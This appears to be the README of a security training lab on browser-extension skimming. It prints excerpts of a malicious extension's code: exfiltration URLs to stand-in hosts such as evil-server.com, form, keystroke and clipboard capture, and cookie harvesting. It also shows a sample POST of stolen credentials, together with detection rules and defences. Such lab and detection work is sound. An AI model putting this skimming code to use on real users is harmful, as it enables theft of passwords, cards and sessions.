# Lab 3: Browser Extension Hijacking

This lab demonstrates **browser extension-based skimming attacks** that exploit
the privileged access and persistence of browser extensions to steal payment
data and credentials.

## Attack Overview

Browser extension hijacking represents a sophisticated attack vector that
leverages:

1. **Privileged Extension APIs** with broad site access
2. **Content Script Injection** across all websites
3. **Background Script Persistence** for continuous monitoring
4. **Cross-Origin Communication** bypassing same-origin policy
5. **Extension Update Hijacking** for supply chain attacks

## Key Differences from Previous Labs

### Attack Vector Evolution

- **Lab 1**: Direct JavaScript injection and form submission interception
- **Lab 2**: DOM manipulation and real-time field monitoring
- **Lab 3**: Browser extension privilege escalation and persistent monitoring

### Technical Approach

- **Extension Manifest V3** with host permissions
- **Content Scripts** injected into all pages
- **Background Service Workers** for persistent operation
- **Extension Storage APIs** for data persistence
- **Cross-Extension Communication** for coordinated attacks

## Lab Scenarios

### Scenario 1: Legitimate Extension Compromise

- Popular password manager extension gets compromised
- Malicious update steals stored passwords and autofill data
- Background scripts monitor all form submissions
- Content scripts capture real-time typing across all sites

### Scenario 2: Malicious Extension Distribution

- Fake security extension with broad permissions
- Social engineering for installation (fake security alerts)
- Persistent monitoring across banking and e-commerce sites
- Data exfiltration through extension's privileged network access

### Scenario 3: Extension Supply Chain Attack

- Compromise of extension developer account
- Malicious code injection into legitimate extension update
- Silent deployment to millions of users
- Long-term persistent access for data harvesting

## ML Training Value

This lab helps detection models learn to identify:

### Extension Privilege Abuse

- Excessive host permissions in manifests
- Suspicious content script injection patterns
- Background script network activity
- Extension storage abuse for data persistence

### Cross-Site Monitoring Patterns

- Universal form field monitoring across domains
- Real-time data capture across all websites
- Cross-origin data aggregation
- Persistent session tracking

### Supply Chain Indicators

- Unusual extension update patterns
- Permission escalation in updates
- Behavioral changes post-update
- Network communication pattern changes

## Detection Signatures

### Manifest Analysis

```json
// Suspicious permission combinations
{
  "permissions": [
    "activeTab",
    "storage",
    "<all_urls>",
    "background",
    "webRequest"
  ],
  "host_permissions": ["*://*/*"]
}
```

### Content Script Patterns

```javascript
// Universal form monitoring
document.addEventListener('submit', captureForm)
document.addEventListener('input', captureKeystrokes)

// Cross-origin communication
chrome.runtime.sendMessage({ type: 'stolen_data', data: formData })
```

### Background Script Signatures

```javascript
// Persistent monitoring setup
chrome.tabs.onUpdated.addListener(injectMonitoring)
chrome.webRequest.onBeforeRequest.addListener(interceptRequests)

// Data aggregation and exfiltration
chrome.storage.local.set({ stolen_data: aggregatedData })
```

## File Structure

```
03-extension-hijacking/
├── legitimate-extension/          # Original legitimate extension
│   ├── manifest.json             # V3 manifest with normal permissions
│   ├── popup/
│   │   ├── popup.html            # Extension popup interface
│   │   ├── popup.js              # Popup functionality
│   │   └── popup.css             # Popup styling
│   ├── content/
│   │   ├── content.js            # Content script for legitimate features
│   │   └── injector.js           # DOM injection utilities
│   ├── background/
│   │   ├── background.js         # Service worker for legitimate features
│   │   └── storage.js            # Storage management
│   └── icons/                    # Extension icons
├── malicious-extension/          # Compromised/malicious version
│   ├── manifest.json             # V3 manifest with excessive permissions
│   ├── popup/
│   │   ├── popup.html            # Maintained appearance for stealth
│   │   ├── popup.js              # Legitimate functionality + backdoor
│   │   └── popup.css             # Original styling
│   ├── content/
│   │   ├── content.js            # Original content + skimming code
│   │   ├── skimmer.js            # Dedicated skimming module
│   │   └── stealth.js            # Anti-detection measures
│   ├── background/
│   │   ├── background.js         # Service worker + C2 communication
│   │   ├── exfiltrator.js        # Data aggregation and exfiltration
│   │   └── persistence.js        # Persistent monitoring setup
│   └── icons/                    # Same icons for stealth
├── vulnerable-site/              # Target e-commerce site
│   ├── shop.html                 # Shopping interface
│   ├── checkout.html             # Checkout page
│   ├── account.html              # User account page
│   ├── js/
│   │   ├── shop.js               # Shopping functionality
│   │   ├── checkout.js           # Checkout processing
│   │   └── account.js            # Account management
│   ├── css/
│   │   ├── shop.css              # Shopping styles
│   │   └── checkout.css          # Checkout styles
│   └── images/                   # Product and UI images
└── test/                         # Playwright test suite
    └── tests/
        ├── extension-loading.spec.js
        ├── content-injection.spec.js
        ├── background-monitoring.spec.js
        ├── data-exfiltration.spec.js
        └── stealth-measures.spec.js
```

## Attack Techniques Demonstrated

### 1. Extension Privilege Escalation

- **Manifest Permission Abuse**: Requesting excessive permissions
- **Host Permission Expansion**: Access to all websites
- **API Permission Exploitation**: Background, storage, webRequest APIs
- **Update Permission Escalation**: Adding permissions in updates

### 2. Content Script Injection

- **Universal Form Monitoring**: Injected across all websites
- **Real-Time Data Capture**: Keystroke and form submission logging
- **DOM Manipulation**: Injecting malicious elements
- **Event Listener Hijacking**: Intercepting user interactions

### 3. Background Script Persistence

- **Service Worker Persistence**: Continuous operation
- **Tab Monitoring**: Tracking user navigation
- **Network Request Interception**: Monitoring API calls
- **Data Aggregation**: Collecting data across sessions

### 4. Cross-Extension Communication

- **Runtime Messaging**: Content to background communication
- **Storage API Abuse**: Persistent data storage
- **Cross-Origin Requests**: Bypassing same-origin policy
- **External C2 Communication**: Data exfiltration

### 5. Supply Chain Attack Simulation

- **Update Mechanism Abuse**: Malicious code in updates
- **Stealth Deployment**: Maintaining appearance and functionality
- **Gradual Permission Expansion**: Slowly requesting more permissions
- **Long-Term Persistence**: Operating undetected for months

## Educational Objectives

### Understanding Extension Security

- Learn browser extension architecture and security model
- Understand permission systems and their limitations
- Explore extension update mechanisms and risks
- Analyze cross-origin communication capabilities

### Attack Vector Analysis

- Study privilege escalation through extension permissions
- Understand persistent monitoring capabilities
- Explore cross-site data aggregation techniques
- Analyze supply chain attack methodologies

### Detection Development

- Develop extension behavior analysis systems
- Create permission anomaly detection
- Build cross-site monitoring detection
- Train models on extension-based attack patterns

### Defense Strategies

- Implement extension security policies
- Deploy runtime behavior monitoring
- Use permission audit systems
- Monitor for suspicious extension activities

## Real-World Context

This lab simulates real attacks like:

- **DataSpii**: Browser extensions stealing personal data
- **Great Suspender**: Popular extension compromised for data theft
- **AdBlock Plus clones**: Fake extensions for ad injection and data theft
- **Crypto wallet extensions**: Targeted for cryptocurrency theft

## Test Suite

### Automated Testing

```bash
# Install dependencies
cd test-server
npm install

# Start data collection server
npm start

# In another terminal, run tests
node test-automation.js
```

### Manual Testing

1. Load the legitimate extension in Chrome:
   - Open Chrome and go to `chrome://extensions/`
   - Enable "Developer mode"
   - Click "Load unpacked" and select `legitimate-extension/`
   - Test basic functionality on the vulnerable site

2. Replace with malicious extension:
   - Remove the legitimate extension
   - Load the `malicious-extension/` directory
   - Navigate to the vulnerable site and fill forms
   - Monitor the data collection server for captured data

3. Test data collection scenarios:
   - Fill customer information forms
   - Enter payment details (use test card numbers)
   - Create account with passwords
   - Test clipboard operations
   - Simulate keystroke patterns

### Test Cases

1. **Extension Loading**: Verify extension installation and activation
2. **Form Monitoring**: Test real-time form field monitoring
3. **Data Capture**: Validate sensitive data collection
4. **Exfiltration**: Confirm data transmission to collection server
5. **Stealth Behavior**: Ensure legitimate functionality is maintained
6. **Credit Card Skimming**: Test payment information capture
7. **Password Harvesting**: Validate authentication data collection
8. **Cookie/Storage Harvesting**: Test session data extraction
9. **Keystroke Logging**: Verify input pattern capture
10. **Clipboard Monitoring**: Test paste operation interception

## Attack Analysis

### Technical Implementation

The malicious extension demonstrates several sophisticated attack techniques:

1. **Privilege Escalation**: Uses extension permissions to bypass same-origin
   policy
2. **Stealth Maintenance**: Preserves all legitimate functionality to avoid
   detection
3. **Real-time Collection**: Captures data as users type, not just on submission
4. **Multiple Vectors**: Combines form monitoring, keystroke logging, and
   clipboard access
5. **Robust Exfiltration**: Multiple fallback channels with error handling

## Detection Guide for Security Tools

### Primary Detection Signatures

#### 1. **Manifest Permission Analysis** (Critical Indicator)

**File**: `/malicious-extension/manifest.json`

```json
{
  "manifest_version": 3,
  "name": "SecureForm Assistant",
  "permissions": [
    "activeTab",
    "storage",
    "cookies",
    "clipboardRead"
  ],
  "host_permissions": [
    "<all_urls>"
  ],
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content/content.js"],
    "run_at": "document_start"
  }]
}
```

**Detection Rules**:
- `<all_urls>` host permissions (universal site access)
- `clipboardRead` permission (unusual for form helpers)
- `cookies` permission without clear justification
- Content scripts injected at `document_start` (early access)
- Combination of storage + network + clipboard permissions

**Risk Assessment**:
- ⚠️ `activeTab` alone: Low risk
- ⚠️⚠️ `activeTab` + `storage`: Medium risk
- 🚨 `<all_urls>` + `cookies` + `clipboardRead`: **CRITICAL**

#### 2. **Dual-Purpose Code Structure** (Stealth Technique)

**File**: `/malicious-extension/content/content.js:1-150`

```javascript
// ==================== LEGITIMATE FUNCTIONALITY ====================
let extensionSettings = {
  formValidation: true,
  securityWarnings: true,
  autofillProtection: true
}

function setupFormMonitoring() {
  // Legitimate form validation...
}

// ==================== MALICIOUS CONFIGURATION ====================
const MALICIOUS_CONFIG = {
  collectUrl: 'https://evil-server.com/collect',
  fallbackUrl: 'http://backup-evil.com/data',
  devUrl: 'http://localhost:3002/stolen-data'

  collectPasswords: true,
  collectCreditCards: true,
  collectPII: true,
  collectCookies: true,

  legitBehaviorMaintained: true,
  targetDomains: ['checkout', 'payment', 'billing', 'account', 'login']
}
```

**Detection Rules**:
- Code blocks labeled "LEGITIMATE" vs "MALICIOUS"
- CONFIG objects with multiple collection URLs
- Fallback/backup exfiltration endpoints
- `legitBehaviorMaintained` flags (intentional stealth)
- Domain targeting arrays for sensitive pages

#### 3. **Universal Form Monitoring** (Behavioral Pattern)

**File**: `/malicious-extension/content/content.js:200-350`

```javascript
function initializeMaliciousCollection() {
  // Check if this is a target site
  isTargetSite = MALICIOUS_CONFIG.targetDomains.some(domain =>
    window.location.href.toLowerCase().includes(domain)
  )

  if (!isTargetSite) {
    console.log('[SecureForm] Not a target site, skipping collection')
    return
  }

  // Monitor ALL form submissions
  document.addEventListener('submit', captureFormData, true)

  // Monitor ALL input changes
  document.addEventListener('input', captureFieldData, true)

  // Monitor clipboard operations
  document.addEventListener('paste', captureClipboardData, true)

  // Periodic data harvesting
  setInterval(harvestSessionData, 30000)
}
```

**Detection Rules**:
- Universal event listeners (`document.addEventListener` instead of specific elements)
- Capture phase listeners (`true` third parameter)
- Domain matching for targeting specific sites
- Periodic harvesting timers (30-second intervals)
- Multiple capture methods (submit + input + paste)

#### 4. **Multi-Channel Data Collection** (Comprehensive Attack)

**File**: `/malicious-extension/content/content.js:400-650`

```javascript
function harvestAllData() {
  const data = {
    // Form data
    forms: collectFormData(),

    // Cookies from all domains
    cookies: await chrome.cookies.getAll({}),

    // LocalStorage across origins
    localStorage: collectLocalStorageData(),

    // Session storage
    sessionStorage: collectSessionStorageData(),

    // Clipboard history
    clipboard: await navigator.clipboard.readText(),

    // Keystroke buffer
    keystrokes: keystrokeBuffer,

    // Page metadata
    metadata: {
      url: window.location.href,
      title: document.title,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      timestamp: Date.now()
    }
  }

  return data
}
```

**Detection Rules**:
- Cookie enumeration across all domains (`chrome.cookies.getAll({})`)
- Storage API abuse (localStorage + sessionStorage)
- Clipboard access without user interaction
- Keystroke logging with circular buffer
- Comprehensive metadata collection

#### 5. **Chrome Extension API Abuse** (Privilege Escalation)

**File**: `/malicious-extension/content/content.js:700-850`

```javascript
// Send collected data to background script
chrome.runtime.sendMessage({
  type: 'exfiltrate_data',
  data: collectedData,
  urgent: isHighValueTarget()
}, (response) => {
  if (response && response.success) {
    clearCollectedData()
  }
})

// Background script handles actual exfiltration
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'exfiltrate_data') {
    // Use background script to bypass CSP
    exfiltrateToC2(message.data)
      .then(() => sendResponse({ success: true }))
      .catch(() => useBeaconFallback(message.data))
  }
})
```

**Detection Rules**:
- `chrome.runtime.sendMessage` for cross-context communication
- Background script used to bypass Content Security Policy (CSP)
- Message types indicating data exfiltration
- Urgent/priority flags for high-value data
- Fallback mechanisms (beacon API, image tags)

### Network Traffic Patterns

**Extension Data Exfiltration**:
```
POST http://localhost:3002/stolen-data
Content-Type: application/json

{
  "sessionId": "ext_1704067800_abc123def",
  "userAgent": "Mozilla/5.0...",
  "url": "https://bank.example.com/login",
  "timestamp": 1704067800000,
  "data": [
    {
      "type": "form_submission",
      "data": {
        "fields": [
          {"name": "username", "value": "john.doe@email.com"},
          {"name": "password", "value": "MyPassword123!"}
        ]
      }
    },
    {
      "type": "cookies",
      "data": {
        "cookies": [
          {"name": "session_token", "value": "eyJhbGc...", "domain": ".bank.example.com"}
        ]
      }
    },
    {
      "type": "clipboard",
      "data": {
        "content": "4532-1234-5678-9010",
        "timestamp": 1704067795000
      }
    }
  ]
}
```

**Detection Indicators**:
- POST requests from extension content scripts
- Payloads containing multiple data types (forms + cookies + clipboard)
- Session IDs prefixed with "ext_"
- Data arrays with type discriminators
- Requests to non-extension domains

### Browser Extension Detection

**Manual Inspection**:

1. **Open Extensions Page** (`chrome://extensions/`):
   - Enable "Developer mode"
   - Check "Permissions" for each extension
   - Look for `<all_urls>`, `cookies`, `clipboardRead`
   - Verify extension description matches permissions

2. **Inspect Extension Files**:
   - Click "Details" on suspicious extension
   - Click "background page" (inspect)
   - Check Console for exfiltration attempts
   - Monitor Network tab for C2 communication

3. **Review Manifest**:
```bash
# Navigate to extension directory
cd ~/Library/Application\ Support/Google/Chrome/Default/Extensions/<extension-id>

# Read manifest
cat manifest.json | jq '.permissions, .host_permissions, .content_scripts'
```

### Static Analysis Detection

**Grep/ripgrep commands** for extension source auditing:

```bash
# Search for data collection patterns
grep -r "cookies.getAll\|localStorage\|clipboard.read" --include="*.js" .

# Search for exfiltration endpoints
grep -r "collectUrl\|exfilUrl\|evil-server\|backup" --include="*.js" .

# Search for runtime messaging
grep -r "runtime.sendMessage\|onMessage.addListener" --include="*.js" .

# Search for excessive permissions
grep -r "<all_urls>\|activeTab.*cookies\|clipboardRead" manifest.json

# Search for stealth/evasion code
grep -r "legitBehavior\|targetDomain\|isHighValue" --include="*.js" .
```

### Runtime Behavior Detection

**Behavioral indicators to monitor**:

1. **Extension Update Patterns**:
   - Sudden permission escalation in updates
   - Version jumps without changelog
   - Changed network communication patterns
   - Behavioral changes post-update

2. **Network Activity**:
   - Extension making requests to non-CDN domains
   - POST requests with large JSON payloads
   - Periodic "heartbeat" requests
   - Requests triggered by user input events

3. **Cross-Site Behavior**:
   - Extension active on banking/payment sites
   - Cookie access from extension context
   - Clipboard reads without user interaction
   - Storage enumeration across domains

4. **Performance Indicators**:
   - High CPU usage during form interactions
   - Memory growth during browsing sessions
   - Frequent message passing to background script
   - Large data structures in extension storage

### Console Detection Script

Run this in DevTools Console to detect malicious extensions:

```javascript
(async function detectMaliciousExtensions() {
  console.log('🔍 Scanning for suspicious extension behavior...')

  // Check for excessive event listeners
  const forms = document.querySelectorAll('form')
  const inputs = document.querySelectorAll('input')

  let suspiciousListeners = 0
  inputs.forEach(input => {
    const listeners = getEventListeners(input)
    if (listeners.input?.length > 2 ||
        listeners.paste?.length > 0 ||
        listeners.keydown?.length > 1) {
      console.warn('⚠️ Excessive listeners on:', input.name, listeners)
      suspiciousListeners++
    }
  })

  // Check for clipboard access
  try {
    const originalRead = navigator.clipboard.read
    navigator.clipboard.read = function() {
      console.error('🚨 Extension attempting clipboard read!')
      return originalRead.apply(this, arguments)
    }
  } catch (e) {}

  // Monitor chrome.runtime usage
  if (typeof chrome !== 'undefined' && chrome.runtime) {
    console.warn('⚠️ Extension APIs available in page context')
    console.log('Extension ID:', chrome.runtime.id)
  }

  // Summary
  console.log(`\n📊 Detection Summary:`)
  console.log(`- Suspicious event listeners: ${suspiciousListeners}`)
  console.log(`- Forms monitored: ${forms.length}`)
  console.log(`- Input fields: ${inputs.length}`)

  if (suspiciousListeners > 5) {
    console.error('🚨 HIGH RISK: Multiple suspicious listeners detected!')
    console.error('Recommended: Review installed extensions immediately')
  }
})()
```

### Defense Strategies

1. **Extension Vetting Process**:
   - Review permissions before installation
   - Check developer reputation and reviews
   - Audit source code for open-source extensions
   - Monitor for permission changes in updates

2. **Enterprise Extension Management**:
```json
// Chrome Enterprise Policy
{
  "ExtensionInstallBlocklist": ["*"],
  "ExtensionInstallAllowlist": [
    "verified_extension_id_1",
    "verified_extension_id_2"
  ],
  "ExtensionInstallForcelist": [
    "security_extension_id"
  ]
}
```

3. **Content Security Policy**:
```html
<!-- Block extension injection -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'; object-src 'none';">
```

4. **Runtime Monitoring**:
   - Log extension network requests
   - Monitor clipboard access
   - Alert on excessive permissions
   - Track extension update patterns

### Detection Signatures Summary

For ML training and security analysis, key detection patterns include:

```javascript
// Extension content script patterns
- Real-time field value capture via event listeners
- Keystroke sequence collection and buffering
- Clipboard event monitoring and data extraction
- Cookie and localStorage enumeration
- Cross-origin data transmission attempts
- MutationObserver usage for dynamic form detection

// Network traffic patterns
- POST requests to suspicious external domains
- Unusual data payloads containing form field structures
- Beacon API usage for reliable data transmission
- Requests triggered by user input events rather than form submission

// Browser behavior patterns
- Extension with legitimate cover functionality
- Permissions broader than stated functionality requires
- Content script injection on all URLs
- Background script with network communication capabilities

// Manifest indicators
- <all_urls> host permissions
- Excessive permission combinations
- Content scripts at document_start
- Background service workers with network access
```

### Defense Strategies

1. **Extension Vetting**: Careful review of extension permissions and code
2. **Network Monitoring**: Detection of unusual outbound traffic patterns
3. **CSP Implementation**: Content Security Policy to limit extension
   capabilities
4. **User Education**: Training on extension risks and verification
5. **Enterprise Controls**: Centralized extension management and allowlisting

## Comparison with Previous Labs

### Lab 1 vs Lab 3

- **Lab 1**: Direct script injection requires compromised site
- **Lab 3**: Extension hijacking leverages trusted user-installed software

### Lab 2 vs Lab 3

- **Lab 2**: DOM-based attacks limited by same-origin policy
- **Lab 3**: Extension privileges bypass browser security boundaries

### Unique Characteristics

- **Trust Exploitation**: Users voluntarily install and trust the malicious code
- **Persistent Access**: Extension remains active across all browsing sessions
- **Broad Scope**: Can target any website the user visits
- **Legitimate Cover**: Maintains useful functionality to avoid suspicion

## Usage Scenarios

1. **Security Research**: Analyze extension-based attack vectors
2. **Red Team Testing**: Simulate sophisticated persistent attacks
3. **Blue Team Training**: Develop extension security monitoring
4. **ML Model Training**: Generate extension-based attack data
5. **Policy Development**: Inform extension security policies

This lab provides comprehensive training for detecting and defending against
browser extension-based attacks that represent one of the most persistent and
privileged attack vectors in modern web security.
